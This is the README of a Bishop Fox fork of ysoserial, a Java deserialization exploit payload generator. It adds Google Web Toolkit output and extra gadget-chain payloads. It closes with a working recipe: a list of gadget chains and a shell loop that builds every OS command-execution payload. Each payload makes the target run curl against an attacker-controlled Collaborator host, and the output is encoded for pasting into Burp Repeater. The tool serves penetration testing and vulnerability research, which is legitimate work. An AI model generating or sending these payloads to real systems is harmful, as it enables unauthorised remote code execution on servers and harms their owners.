# ysoserial - Bishop Fox fork

This is a fork of [ysoserial](https://github.com/frohoff/ysoserial) that incorporates some additional features. Refer to the original project for most of the documentation.

## GWT serialization output

The original motivation for this fork was to add support for the nonstandard serialization format used by Google Web Toolkit (GWT). To output in GWT format, add the `--gwt` option, with a field name, e.g. `--gwt default`, `--gwt bishopfox`, etc. It's not necessary to pick a valid field name, but GWT will get a little farther in its deserialization logic if the field name is valid for the type of object the payload is being injected into, and this might be beneficial in some cases.

You can try out the GWT serialization output feature using [the example vulnerable GWT web app](https://github.com/BishopFox/VulnerableGWTApp) discussed in [the Bishop Fox blog post "GWT: An Eight-Year-Old Unpatched Java Deserialization Vulnerability"](https://bishopfox.com/blog/gwt-unpatched-unauthenticated-java-deserialization-vulnerability)

## Merged back-catalogue pull requests

This fork also includes content from 11 unmerged pull requests in the mainline project that seemed useful:

* [PR#200 - Jython2 payload](https://github.com/frohoff/ysoserial/pull/200) (renamed Jython3 to avoid conflict with PR#153)
* [PR#192 - MozillaRhino3 payload](https://github.com/frohoff/ysoserial/pull/192)
* Partial implementation of [PR#189 - Improved command-line handling](https://github.com/frohoff/ysoserial/pull/189) (adds the argument-handling logic, but not the -s and -p options because they seemed potentially fragile)
* [PR#184 - Improved C3P0 payload](https://github.com/frohoff/ysoserial/pull/184) (implemented as a new "C3P02" payload so the original version can still be easily used)
* [PR#177 - WildFly1 payload](https://github.com/frohoff/ysoserial/pull/177)
* [PR#172 - TLS support for RMIRegistryExploit utility](https://github.com/frohoff/ysoserial/pull/172)
* [PR#167 - ROME2 payload](https://github.com/frohoff/ysoserial/pull/167)
* [PR#162 - RMIRegistryExploit utility should only call createMemoitizedProxy if the payload is not already a Remote instance](https://github.com/frohoff/ysoserial/pull/162)
* [PR#159 - Jdk7u21variant payload](https://github.com/frohoff/ysoserial/pull/159)
* [PR#153 - Jython2 and JythonZeroFile payloads](https://github.com/frohoff/ysoserial/pull/153)
* [PR#134 - Improved help message output](https://github.com/frohoff/ysoserial/pull/134) (modified the default width from 210 to 80 for better compatibility)

# Usage

You can try skipping the build steps below and using the precompiled JAR file available in the releases list for this repo.

Otherwise, compile the code using the same steps as for the main project (version 11 JRE, etc.):

```
mvn clean package -DskipTests
```

You may receive errors similar to the following, depending on your Linux distribution, how long you've had Maven installed on it, etc.:

```
[WARNING] The POM for javax.interceptor:javax.interceptor-api:jar:3.1 is missing, no dependency information available
...omitted for brevity...
[ERROR] Failed to execute goal on project ysoserial: Could not resolve dependencies for project ysoserial:ysoserial:jar:0.0.6-SNAPSHOT: The following artifacts could not be resolved: javax.interceptor:javax.interceptor-api:jar:3.1 (absent): javax.interceptor:javax.interceptor-api:jar:3.1 was not found in
https://repo.jenkins-ci.org/public/
during a previous attempt. This failure was cached in the local repository and resolution is not reattempted until the update interval of jenkins has elapsed or updates are forced -> [Help 1]
```

If so, unpack the file `lib/javax.interceptor-api-3.1.tar.gz` into your user-level Maven directory (usually `~/.m2`). Doing so should result in the creation of a subdirectory named `repository/javax/interceptor/javax.interceptor-api` containing at least four files. The root cause is that the 3.1 library was built, released, and many projects added it as a depenedency, then [the maintainers decided it was a mistake and deleted the library](https://github.com/jakartaee/interceptors/issues/4). This repo may be updated at a later date to use a different version of the library so that this step is not necessary.

Once compiled, using this fork of `ysoserial` is the same as the standard version unless you want to output in GWT mode.

```
Usage: java -jar ysoserial-[version]-all.jar [options] <payload> '<command>'
  Options:
    -h,--help                  Print usage
    -G,--gwt <field name>      Output in Google Web Toolkit (GWT) serialization format:
      ex. --gwt default
```

# Quickly trying all command execution payloads

Trying `URLDNS` first with a URL based on your Burp Suite Collaborator hostname is always a good idea, because most systems can resolve public DNS names. If you've confirmed that `URLDNS` works, but want to attempt actual code execution, this section provides an option for building all of the OS command execution payloads, which you can then copy/paste into Burp Repeater or similar.

These steps generate all possible OS command execution payloads for testing in conjunction with a Burp Suite Collaborator server in a way that will let you know which (if any) succeeded. The way this is accomplished is by executing a command that makes and HTTP request to your Collaborator server for a URI named after the payload. So if you see entries in your Collaborator console for `/CommonsBeanutils1`, you know that the `CommonsBeanutils1` gadget chain works against the target.

This example uses `curl`, which will of course fail if a system is vulnerable but does not have `curl` installed. You could modify the steps to try the same approach using `wget`, `nc`, etc. If none of those work, you could use `ping -c3`, `nslookup`, or `host`, but those will only let you know that a command succeeded, not which payload was responsible. 

First create a file named `command_execution_payloads.txt` containing the following lines:

```
BeanShell1
C3P0
C3P02
Click1
Clojure
CommonsBeanutils1
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
Groovy1
Hibernate1
Hibernate2
JavassistWeld1
JBossInterceptors1
Jdk7u21
Jdk7u21variant
JSON1
Jython2
Jython3
JythonZeroFile
MozillaRhino1
MozillaRhino2
MozillaRhino3
ROME
ROME2
Spring1
Spring2
Vaadin1
```

Then execute the following commands, substituting the Collaborator DNS name and your `ysoserial` JAR path (e.g. `target/ysoserial-0.0.6-SNAPSHOT-all.jar`) where indicated. 

```
export COLLABORATOR="<your Collaborator DNS name here>"
export YSOSERIAL="<your ysoserial JAR path here>"
export FIELDNAME="bishopfox"
mkdir "payloads-${COLLABORATOR}-curl"

while read pn; do \
   java -jar "${YSOSERIAL}" \
   --gwt "${FIELDNAME}" \
   "${pn}" \
   "curl http://${COLLABORATOR}/${pn}" \
   | base64 -w0 | sed 's/+/\$/g' | sed 's./._.g' \
   > "payloads-${COLLABORATOR}/${pn}.bin.b64"; \
   done<command_execution_payloads.txt
```

You can then copy/paste the payloads into Burp Repeater or similar.
